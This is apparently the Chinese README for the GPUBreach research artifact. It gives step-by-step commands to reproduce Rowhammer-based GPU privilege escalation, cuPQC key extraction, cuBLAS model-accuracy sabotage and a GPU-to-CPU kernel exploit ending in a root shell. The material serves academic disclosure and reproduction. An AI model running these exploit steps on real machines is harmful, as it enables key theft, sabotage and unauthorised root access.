# GPUBreach（IEEE 安全与隐私研讨会，2026年）

## 简介

本文是论文 **"GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer"** 的代码构件，该论文将在 [IEEE 安全与隐私（Oakland）2026](https://sp2026.ieee-security.org/) 上发表。

作者：
Chris S. Lin, Yuqin Yan, Joyce Qu, Joseph Zhu, Guozhen Ding, David Lie, Gururaj Saileshwar。
多伦多大学

## 本构件可复现的结果

在本构件中，我们旨在复现以下内容：

1. 页表（PT）操控原语（图5、图7、图8和图10）

2. GPU 提权攻击 — 使用 GPUBreach 实现任意读写能力（表2，第6.1—6.3节，表3）

3. CPU 提权攻击 — 端到端 GPU-CPU 漏洞利用（第6.4节）

所有结果均为自动生成，**唯独** *CPU提权漏洞利用* 包含交互式环节（详见下文）。

**请参阅 [`src/README.md`](https://github.com/sith-lab/gpubreach/blob/main/src/README.md) 了解其他使用/实现细节。**

## 所需环境

**运行环境：** 建议使用兼容 g++-11 或更新版本的 Linux 发行版。

- 软件依赖：
   - CMake 3.22+
   - 支持 C++17 的 g++
   - NVIDIA CUDA 驱动：580.95.05
   - NVIDIA CUDA Toolkit
   - NVIDIA 系统管理接口 `nvidia-smi`
   - Python 3.10+

- 硬件依赖：
   - NVIDIA GPU sm_80+

### 参考环境

我们的参考系统：

- 操作系统：Ubuntu 22.04.5 LTS
- CPU：AMD Ryzen Threadripper PRO 5945WX 12核
- GPU：NVIDIA RTX A6000（48 GB GDDR6，sm_80）
- 驱动：NVIDIA Driver 580.95.05（包含 nvidia-smi）
- CUDA Toolkit：12.8
- 编译器：g++ 10.5.0

## 构件评估步骤

<!-- **对于构件评估，可直接跳至[第4步（运行构件）](#4-运行构件)，因为我们已经搭建好环境（第1至3步）。** -->

## 1. 克隆仓库（使用Zenodo可忽略）

确保你已克隆仓库：

```bash
git clone https://github.com/sith-lab/gpubreach.git
cd gpubreach
```

## 2. NVIDIA 驱动设置

我们的分析结果需要 [`gpu-tlb`](https://github.com/0x5ec1ab/gpu-tlb.git) 仓库中开发的工具集。该工具已包含在我们的构件中。使用 `gpu-tlb` 的修改版对 NVIDIA 驱动打补丁的步骤如下：（此步骤在AE评估时可跳过，因为我们已在本地GPU上搭建了打过补丁的驱动）

```bash
cd gpubreach

wget https://us.download.nvidia.com/XFree86/Linux-x86_64/580.95.05/NVIDIA-Linux-x86_64-580.95.05.run

chmod +x NVIDIA-Linux-x86_64-580.95.05.run

./NVIDIA-Linux-x86_64-580.95.05.run -x

cd NVIDIA-Linux-x86_64-580.95.05/

# 此补丁同样适用于我们的版本。
patch -p1 < ../gpu-tlb/dumper/patch/driver-570.133.07.patch
```

现在使用安装程序来安装驱动。请选择 **MIT/GPL** 安装方式，其他选项保持默认。

```bash
sudo ./nvidia-installer
```

之后，运行以下命令来构建相关的转储工具。

```bash
cd ../ # 返回 gpubreach 目录
bash run_make_dumpers.sh
```

## 3. GPU 设置与软件前置条件

#### GPU 设置

对于 Rowhammer 攻击，前提条件是 **禁用 ECC**。我们观察到许多云服务商上的 A6000 GPU 默认就是禁用 ECC 的。但若它处于启用状态，请使用以下命令禁用它（我们在本地 GPU 上已设置好，因此 AE 评估时可跳过此步骤）：

```bash
# AE 评估无需执行此操作。
sudo nvidia-smi -e 0
rmmod nvidia_drm
rmmod nvidia_modeset
sudo reboot
```

启用持久模式并固定 GPU 和显存频率有助于我们的分析，尽管这些并非强制要求。以下脚本执行上述操作：

```bash
# 使用示例：
#  bash ./gpuhammer/util/init_cuda.sh <最大GPU频率> <最大显存频率>
cd gpubreach
bash gpuhammer/util/init_cuda.sh 1800 7600
```

**MAX_GPU_CLOCK** 和 **MAX_MEMORY_CLOCK** 可通过 CUDA 示例中的 `deviceQuery` 获取。我们在 `gpuhammer/src/deviceQuery.txt` 中提供了 A6000 的对应值。

这些更改可以通过 `bash gpuhammer/util/reset_cuda.sh` 撤销。

#### 下载 ImageNet 验证数据集

本构件需要 ImageNet 2012 验证数据集，可从 ImageNet 官方网站获取。请注意，下载需要（免费）注册 ImageNet 账户——请先前往 https://www.image-net.org/download-images.php 注册。

我们需要 ImageNet 2012 数据集页面中"Images"下的"Validation images (all tasks)"。请获取下载链接，并按以下方式下载**到仓库根目录**：

```bash
# 确保你将文件下载到仓库根目录
cd gpubreach
wget <下载链接>
```

下载的文件名应为 `ILSVRC2012_img_val.tar`。

## 4. 运行构件

运行以下命令设置环境变量、安装依赖并构建 GPUBreach。

**重要提示：你需要为每个终端执行 `source ./init_env.sh`，或将相关导出项添加到 `.bashrc`。**

```bash
cd gpubreach
source ./init_env.sh
```

然后运行：

```bash
bash ./run_auto_artifacts.sh
```

`./run_auto_artifacts.sh` 运行的是构件中可以*非交互式*完成的部分。包括 PT 区域操控实验（图5、图7、图8、图10）以及第6.1—6.3节中 GPU 端提权攻击的演示。为便于复现，我们对所有这些攻击均使用表2中已发现的其中一个比特翻转（A1）。

---

### 1. PT 操控原语（图5、图7、图8、图10）

对于 PT 操控原语，`./run_auto_artifacts.sh` 将运行以下步骤来生成结果：

```bash
bash run_fig5.sh   #（约30分钟）；不同分配大小下使用的页类型。
bash run_fig7.sh   #（< 1分钟）；用于识别内存何时填满的 UVM 驱逐侧信道。
bash run_fig8.sh   #（< 1分钟）；PT区域与内存一起分配时的 UVM 驱逐侧信道。
bash run_fig10.sh  #（< 1分钟）；使用 4KB 页面的 UVM 驱逐侧信道。
```

结果将保存在 `results/` 目录中。

> **注意：** 我们还在 `./results/sample` 文件夹中额外提供了所有实验的示例输出。

##### 图5

通过 `bash run_fig5.sh` 复现。它迭代尝试不同分配大小，并通过 `gpu-tlb` 转储工具提取所使用的数据页大小。若输出的 PDF 显示大于 2MB 的分配使用 4KB 页面，并与 `./results/sample/fig5.pdf` 参考一致，则结果复现成功。

##### 图7

通过 `bash run_fig7.sh` 复现。若输出的 PDF 显示约 24000 次分配后出现约 0.2 毫秒的时序尖峰，并与 `./results/sample/fig7.pdf` 参考一致，则结果复现成功。由于我们构件使用了更新的驱动，时序可能与论文中略有不同。

##### 图8

通过 `bash run_fig8.sh` 复现。若输出的 PDF 显示释放 2MB 空间时出现时序尖峰，而释放 4MB 空间时没有，并与 `./results/sample/fig8.pdf` 参考一致，则结果复现成功。

##### 图10

通过 `bash run_fig10.sh` 复现。若输出的 PDF 显示每 508 次分配出现持续的时序尖峰，并与 `./results/sample/fig10.pdf` 参考一致，则结果复现成功。

---

### 2. GPU 提权攻击（第6.1—6.3节）

`./run_auto_artifacts.sh` 还运行演示 GPU 端提权攻击（第6.1—6.3节中的漏洞利用）的部分。它运行以下脚本，复现已发现的脆弱比特翻转（表2），并使用其中一个比特翻转（表2中的 A1）进行后续实验。

```bash
bash run_t2.sh                #（< 10分钟）；对论文中使用的已知脆弱比特翻转位置进行锤击，以复现表2。
bash run_gpubreach_demo.sh    #（< 5分钟）；运行漏洞利用，从 GPU 内存中读取/修改另一个进程的数据。
                              ## 提权攻击约需17秒，其余时间用于演示用的内存转储。
bash run_cupqc_exploit.sh     #（< 1小时）；运行漏洞利用，然后定位受害 cuPQC 内核使用的内存并提取密钥。
bash run_ml_exploit.sh        #（< 10分钟）；运行漏洞利用，然后通过已知的脆弱 cuBLAS SASS 模板修改 cuBLAS 分支，从而普遍降低模型精度。
```

> **注意1：** 除 `run_t2.sh` 外，其他脚本会生成分离的后台进程，如果决定提前终止漏洞利用脚本，需要手动终止这些进程。

> **注意2：** 漏洞利用链有极低概率导致攻击程序崩溃，此时只需在所有进程终止后重新运行漏洞利用脚本，或在必要时按照[调试提示](#调试提示)进行重启或电源循环。

#### 表2（第6.1节）

通过 `bash run_t2.sh`，我们运行 GPUHammer 来复现表2中的比特翻转。所有这些翻转都位于适合我们篡改 GPU 页表的合适位置。

如果 `results/t2/t2.txt` 中的结果与论文中的表2存在交集，则表2生成成功。请注意，由于 Rowhammer 的时间随机性，有时可能无法复现所有翻转。

#### GPUBreach 演示（第6.1节）

通过 `bash run_gpubreach_demo.sh`，GPUBreach 漏洞利用链在我们的 GPU 上自动运行并实现 GPU 提权，获得 GPU 内存的任意读写权限。通过展示我们可以读取和修改 GPU 内存中另一个程序的数据来证明这些权限。一旦完成此步骤，就可以执行第6.2节和第6.3节中的漏洞利用。

在此演示中，运行来自 `./data_scripts/gpubreach_demo/sample_app.cu` 的受害程序，并将其内存初始化为 **0xdeadbeefabcdabcd**。

如果 `results/gpubreach_demo/memdump.txt` 中的结果显示 GPUBreach 转储的内存包含 **0xdeadbeefabcdabcd**，并且 `results/gpubreach_demo/app.out` 显示 "Modified. Exiting"（表明此内存也被 GPUBreach 修改），则 GPU 提权攻击成功。

#### cuPQC 漏洞利用（第6.2节）

通过 `bash run_cupqc_exploit.sh`，在 GPU 提权之后，攻击者利用 cudaFree/Alloc() 的内存清零行为来定位受害程序使用的内存。然后快速转储找到的候选受害页面，查找密钥。

在此演示中，来自 `./data_scripts/cupqc_exploit/keyexchange_victim.cu` 的受害程序每2秒运行一次。攻击者每次都会探测每个候选页面并转储内容。

如果 `results/cupqc_exploit/cupqc.txt` 中的结果显示其中一个候选页面成功转储并包含预期的密钥值，则攻击成功。

#### ML 精度降级漏洞利用（第6.3节）

通过 `bash run_ml_exploit.sh`，在 GPU 提权之后，攻击者在 GPU 内存中搜索已知的脆弱 cuBLAS 模板并破坏该脆弱分支。

在此演示中，运行来自 `./data_scripts/ml_exploit/run_imagenet_models.py` 的受害程序。一旦 PyTorch cuBLAS 代码加载到 GPU 代码段中，攻击者将在其空闲时间破坏目标分支，导致所有模型精度普遍下降。

如果 `results/ml_exploit/t3.txt` 中的结果显示与论文中表3类似的精度退化和性能影响，则攻击成功。

---

### 3. CPU 提权攻击（第6.4节）

此漏洞利用从 GPU 上的用户空间发起，并（在假设 IOMMU 保护已启用的情况下）实现对 CPU 内核内存的任意写原语。攻击者通过 GPU 发起 DMA 访问（IOMMU允许访问的区域），篡改 CPU 内存中的 GPU 驱动元数据。这些被篡改的数据在被 GPU 驱动使用时，会导致缓冲区溢出，从而覆写 GPU 驱动中包含内核内存指针的相邻缓冲区。最终实现在整个内核空间内的任意写原语：攻击者利用内核空间中的任意写原语将当前进程的 `euid` 覆写为 0，从而获得 root shell。

我们评估的 CPU 端配置如下：

```
Architecture:            x86_64
  CPU op-mode(s):        32-bit, 64-bit
  Address sizes:         48 bits physical, 48 bits virtual
  Byte Order:            Little Endian
CPU(s):                  24
  On-line CPU(s) list:   0-23
Vendor ID:               AuthenticAMD
  Model name:            AMD Ryzen Threadripper PRO 5945WX 12-Cores
    CPU family:          25
    Model:               8
    Thread(s) per core:  2
    Core(s) per socket:  12
    Socket(s):           1
    Stepping:            2
NUMA:
  NUMA node(s):          1
  NUMA node0 CPU(s):     0-23
```

#### 第0步：准备工作

**转储 Cred 结构地址**

此步骤获取进程 `cred` 结构体的地址。这基于漏洞利用的假设：进程的 `cred` 数据结构可以通过其他侧信道泄露。

```bash
$ cd gpubreach/cred_mod/
$ make
$ sudo insmod get_cred_addr.ko
```

**构建 CPU 端漏洞利用**

接下来，我们构建 CPU 端的漏洞利用组件。同时生成包含 1GB 重复 "0x64" 数据模式的 `d_pattern.bin` 文件，该数据将填充到 GPU 内存中。此模式用于识别我们控制的虚拟地址（VA）对应的物理地址（PA）及相关的页表项（PTE），我们最终会将 PTE 重定向到 IOVA 区域。

```bash
$ cd gpubreach/d2h-tools/
$ ./create_d_pattern.py --size 1GB --output d_pattern.bin
$ cd cpu-exploit/
$ make -j
```

---

#### 第1步：执行 GPUBreach

此步骤将执行 GPU 端提权攻击，找到我们控制的虚拟地址对应的候选 PTE，并将其重定向以指向 IOVA。

**首先，我们执行为此漏洞利用设计的 GPUBreach 程序。**

```bash
$ cd gpubreach
$ python3 gpubreach.py app_cpu_exploit --n_step1 24109 -t 0.2 -s 15 -c "$BREACH_ROOT/flip_config_sample/FLIP_LEFT_TMPL.ini"
```

> 注意：'-c' 是 A1 的比特翻转配置文件。详见 `src/README.md`。

当篡改成功时，程序将暂停，你会看到以下文本：

```text
(Stable Primitive Ready) Start cpu-exploit now. It should load its page with 0x6464646464646464.
Press Enter Key to start finding and modifying that page's PTE.
```

**接下来，我们定位需要篡改以访问 IOVA 的 PTE。**

**在第二个终端**中，请执行以下命令，首先用 `0x6464646464646464` 加载攻击者内存：

```bash
$ cd gpubreach/d2h-tools
$ ./cpu-exploit/cpu-exploit ./d_pattern.bin
```

一旦打开了新的终端，表示数据已加载完毕。现在回到 GPUBreach 的终端（第一个终端）并**按 Enter 键**。成功时，GPUBreach 将打印以下文本：

```text
Found its PTE, modified your pointer's PTE to point to: 0x060000000fff0005
Press Enter Key if you want to write 0x060000000ffe0005 instead.
```

请注意，GPU 的 IOVA 值在多次运行和不同机器间是稳定的，始终为 0xffe41000 或 0xfff41000。不幸的是，我们无法知道每次启动时使用的是哪一个，因此攻击可能会失败。无论如何，你可以按照 GPUBreach 输出中的提示，选择写入 `0x060000000fff0005` 或 `0x060000000ffe0005`。

现在可以继续第2步。

---

#### 第2步：执行 CPU 提权攻击

在 `./cpu-exploit` 打开的命令提示符中（上面的第二个终端），逐步运行以下应用程序命令。注意 `>` 表示这些命令在漏洞利用的命令提示符中运行，而非在常规 shell 中。

```bash
> poc-init                      # 通过扫描内存初始化操作的缓冲区基址。
> poc-cw-entry0-checksum        # 扫描槽位，发现当前序号，并推断接下来将使用的若干序号。然后生成一个负载，指示后面跟着 16 条消息并附带正确的校验和，并将其写入 POC 预测 GPU 驱动将使用的下一个条目。
> poc-privesc                   # 构造 17 条消息的负载，使其溢出缓冲区，然后覆写驱动中的 GSP 消息队列。
> poc-trigger 1                 # 启动一个持续发送 GPU 查询的线程。
```

---

#### 第3步：验证 CPU 提权

现在可以返回漏洞利用的命令提示符并检查你的权限：

```bash
> whoami
```

**预期输出：**

```
User identity check:
  Real UID:      1000（这是你的原始 UID，可能与此不同）
  Effective UID: 0
```

Effective UID 为 0 表示成功提权至 root。

如果 Effective UID 不为 0，则漏洞利用失败。你可以尝试再次执行 `poc-trigger 5`。**如果仍然不成功，可能需要通过带外方式重启机器并重新开始漏洞利用。**

---

#### 第4步：获取 root shell

如果上一步已成功，使用 `fork` 命令获取 root shell：

```bash
> fork
```

**预期输出：**

```
In child process (PID: XXXX)
Effective UID: 0
# whoami
root
# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin)
```

你现在从普通用户开始，获得了 root shell。

---

#### 替代第1步：使用模拟比特翻转进行漏洞利用

若仅需复现驱动端漏洞和 CPU 提权，我们可以尝试通过模拟 GPU 端提权（不使用 GPUBreach，而使用 `gpu-tlb` 转储工具）来执行漏洞利用。

> 这是因为有时比特翻转会暂时消失，尤其是我们在对机器进行电源循环后（参见[调试提示](#调试提示)）。

在一个终端中执行：

```bash
$ cd gpubreach/d2h-tools
$ ./cpu-exploit/cpu-exploit ./d_pattern.bin  # 以有 GPU 访问权限的普通用户（非root）身份运行此命令。
```

我们将使用 `simulate_rowhammer.sh` 脚本模拟任意读写，而不使用 GPUBreach。将 `simulate_rowhammer.sh` 中的 `IOVA_BASE` 修改为 `0xfff00000` 或 `0xffe00000`。

在另一个终端中执行：

```bash
$ cd d2h-tools/gpu_mem_dumper/scripts/
$ sudo bash ./simulate_rowhammer.sh
```

现在你可以回到上面的第2步。

---

### 调试提示

1. 带外重启后，由于电压变化，我们注意到比特翻转会暂时消失。每次重启后，运行以下命令来检查比特翻转：

   ```bash
   cd gpubreach

   source ./init_env.sh   # 如果之前已运行过则不需要
   bash run_regenerate_a1.sh
   ```

   它将迭代锤击并检查比特翻转是否重新出现。不幸的是，何时重新出现有些不确定（有时需要几分钟）。你可以选择等待几小时后再重启该过程。对于 CPU-GPU 漏洞利用，鉴于我们已演示了任意读写能力，你也可以转到[替代第1步](#替代第1步使用模拟比特翻转进行漏洞利用)。
